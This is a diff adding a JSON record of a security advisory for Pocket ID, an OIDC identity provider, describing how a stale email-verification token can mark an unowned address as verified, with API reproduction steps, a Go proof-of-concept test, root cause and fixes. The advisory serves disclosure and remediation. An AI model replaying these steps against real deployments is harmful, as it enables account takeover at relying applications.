@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-rm8c-2cv8-jwf6",
+  "repo": {
+    "cve_id": "CVE-2026-115770",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-345"
+    ],
+    "description": "# Email verification token remains valid after address change, enabling arbitrary verified-email spoofing\r\n\r\n## Summary\r\n\r\nAn authenticated Pocket ID user can request an email-verification token while their account uses an address they control, change the account email address, and then redeem the previously issued token. The token is bound only to the user ID, not to the address to which it was sent, and changing the address does not revoke outstanding tokens.\r\n\r\nAs a result, Pocket ID marks the newly supplied address as verified even though the user never proved control of it. Pocket ID subsequently returns that address with `email_verified: true` in OIDC claims. A relying party that trusts this claim for email-based account linking or provisioning can therefore link the attacker's Pocket ID identity to a victim's existing account, leading to cross-application account takeover.\r\n\r\nI reproduced this against commit `9f559788a44cfea790de360da0a74d4bdf8ca5d5`.\r\n\r\n## Preconditions\r\n\r\n- The attacker has an ordinary Pocket ID user account.\r\n- Email verification is in use (`emailsVerified=false`, which is the default).\r\n- The user can edit their own account (`allowOwnAccountEdit=true`, which is the default).\r\n- The target address is not already assigned to another Pocket ID user.\r\n- For downstream account takeover, a relying party links or provisions users based on a trusted, verified email address. Applications that rely exclusively on the stable OIDC `sub` claim are not affected by that downstream consequence.\r\n\r\nNo administrator privilege, victim interaction, or access to the victim's mailbox is required.\r\n\r\n## Reproduction through the API\r\n\r\n1. Sign in as an ordinary user whose current email address is controlled by the attacker, for example `attacker@example.test`.\r\n2. Call `POST /api/users/me/send-email-verification`.\r\n3. Obtain the token from the message delivered to `attacker@example.test`, but do not redeem it yet.\r\n4. Call `PUT /api/users/me` and change the account email to an address the attacker does not control, for example `victim@example.test`.\r\n5. Observe that the new address is initially stored with `emailVerified: false`.\r\n6. Call `POST /api/users/me/verify-email` with the token delivered to `attacker@example.test`.\r\n7. Call `GET /api/users/me`. The current address is now `victim@example.test` and `emailVerified` is `true`.\r\n8. Complete an OIDC flow with the `email` scope. Pocket ID emits:\r\n\r\n```json\r\n{\r\n  \"email\": \"victim@example.test\",\r\n  \"email_verified\": true\r\n}\r\n```\r\n\r\nThe old token has therefore verified a different address from the one to which it was delivered.\r\n\r\n## Executable regression test / proof of concept\r\n\r\nSave this as `backend/internal/service/audit_email_verification_test.go` and run:\r\n\r\n```text\r\ngo test -tags=exclude_frontend,unit ./internal/service -run TestAuditEmailVerificationTokenSurvivesEmailChange -count=1 -v\r\n```\r\n\r\nThe test passes on the referenced commit and demonstrates the unintended state transition:\r\n\r\n```go\r\npackage service\r\n\r\nimport (\r\n\t\"testing\"\r\n\t\"time\"\r\n\r\n\t\"github.com/stretchr/testify/require\"\r\n\r\n\t\"github.com/pocket-id/pocket-id/backend/internal/appconfig\"\r\n\t\"github.com/pocket-id/pocket-id/backend/internal/dto\"\r\n\t\"github.com/pocket-id/pocket-id/backend/internal/model\"\r\n\tdatatype \"github.com/pocket-id/pocket-id/backend/internal/model/types\"\r\n)\r\n\r\nfunc TestAuditEmailVerificationTokenSurvivesEmailChange(t *testing.T) {\r\n\tuserService, _ := newTestUserService(t)\r\n\tconfig := &appconfig.AppConfigModel{\r\n\t\tRequireUserEmail:    \"true\",\r\n\t\tAllowOwnAccountEdit: \"true\",\r\n\t\tEmailsVerified:      \"false\",\r\n\t}\r\n\r\n\tattackerEmail := \"attacker-controlled@example.test\"\r\n\tuser, err := userService.CreateUser(t.Context(), config, dto.UserCreateDto{\r\n\t\tUsername:      \"attacker\",\r\n\t\tEmail:         &attackerEmail,\r\n\t\tEmailVerified: false,\r\n\t})\r\n\trequire.NoError(t, err)\r\n\r\n\tconst tokenFromAttackerMailbox = \"token-issued-for-attacker-email\"\r\n\trequire.NoError(t, userService.db.Create(&model.EmailVerificationToken{\r\n\t\tUserID:    user.ID,\r\n\t\tToken:     tokenFromAttackerMailbox,\r\n\t\tExpiresAt: datatype.DateTime(time.Now().Add(time.Hour)),\r\n\t}).Error)\r\n\r\n\tvictimEmail := \"victim@example.test\"\r\n\t_, err = userService.UpdateUser(t.Context(), config, user.ID, dto.UserCreateDto{\r\n\t\tUsername: user.Username,\r\n\t\tEmail:    &victimEmail,\r\n\t}, true, false)\r\n\trequire.NoError(t, err)\r\n\r\n\tchanged, err := userService.GetUser(t.Context(), user.ID)\r\n\trequire.NoError(t, err)\r\n\trequire.Equal(t, victimEmail, *changed.Email)\r\n\trequire.False(t, changed.EmailVerified)\r\n\r\n\trequire.NoError(t, userService.VerifyEmail(\r\n\t\tt.Context(),\r\n\t\tuser.ID,\r\n\t\ttokenFromAttackerMailbox,\r\n\t))\r\n\r\n\tverified, err := userService.GetUser(t.Context(), user.ID)\r\n\trequire.NoError(t, err)\r\n\trequire.Equal(t, victimEmail, *verified.Email)\r\n\trequire.True(t, verified.EmailVerified)\r\n}\r\n```\r\n\r\nObserved result:\r\n\r\n```text\r\n=== RUN   TestAuditEmailVerificationTokenSurvivesEmailChange\r\n--- PASS: TestAuditEmailVerificationTokenSurvivesEmailChange\r\nPASS\r\n```\r\n\r\n## Root cause\r\n\r\n`backend/internal/model/email_verification_token.go` stores only a token, expiration, and user ID. It does not store or cryptographically bind the address being verified.\r\n\r\n`UserService.SendEmailVerification` creates the token for `user.ID` and sends it to the current `user.Email`, but that email is not part of the token record:\r\n\r\n```go\r\nemailVerificationToken := &model.EmailVerificationToken{\r\n\tUserID:    user.ID,\r\n\tToken:     randomToken,\r\n\tExpiresAt: datatype.DateTime(expiration),\r\n}\r\n```\r\n\r\n`UserService.UpdateUser` resets the verification flag when the address changes but leaves existing verification tokens valid.\r\n\r\n`UserService.VerifyEmail` validates only the token, user ID, and expiry, then sets `EmailVerified` on the user's current record:\r\n\r\n```go\r\nerr := tx.WithContext(ctx).Where(\r\n\t\"token = ? AND user_id = ? AND expires_at > ?\",\r\n\ttoken,\r\n\tuserID,\r\n\tdatatype.DateTime(time.Now()),\r\n).First(&emailVerificationToken).Error\r\n\r\nuser, err := s.getUserInternal(ctx, emailVerificationToken.UserID, tx)\r\n// ...\r\nuser.EmailVerified = true\r\n```\r\n\r\nFinally, `backend/internal/oidc/claims_service.go` publishes the current address and flag together:\r\n\r\n```go\r\nclaims[\"email\"] = *user.Email\r\nclaims[\"email_verified\"] = user.EmailVerified\r\n```\r\n\r\n## Impact\r\n\r\nThe direct impact is an authentication-integrity failure in an identity provider: any ordinary user can cause Pocket ID to attest control of an arbitrary unused email address.\r\n\r\nThe security boundary crossed by that false attestation is the relying application. Where a relying party treats `email_verified=true` as proof of address ownership and uses email for automatic account matching, the attacker can be signed into or linked to the victim's existing relying-party account. This can expose all data and actions available through that account.\r\n\r\nSuggested CVSS 3.1 vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` (9.6, Critical).\r\n\r\n## Suggested remediation\r\n\r\n1. Store a normalized target email address (or a keyed hash of it) with every verification token.\r\n2. During redemption, atomically require that the stored target address still equals the user's current normalized email address.\r\n3. Invalidate all outstanding email-verification tokens whenever the account email changes.\r\n4. Invalidate prior outstanding tokens when issuing a replacement token.\r\n5. Add a regression test that changes the email after issuance and requires the old token to be rejected.\r\n\r\n## Testing note\r\n\r\nSource review and test construction were AI-assisted. The finding, affected control flow, preconditions, and executable proof of concept were validated against the referenced Pocket ID commit before submission.\r\n",
+    "ghsa_id": "GHSA-rm8c-2cv8-jwf6",
+    "html_url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-rm8c-2cv8-jwf6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-rm8c-2cv8-jwf6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-115770"
+      }
+    ],
+    "published_at": "2026-07-29T23:02:34Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Email verification token remains valid after address change, enabling arbitrary verified-email spoofing",
+    "updated_at": "2026-10-23T20:08:33Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pocket-id/pocket-id/backend"
+        },
+        "patched_versions": "v2.12.0",
+        "vulnerable_version_range": ">= v2.2.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "pocket-id/pocket-id"
+}
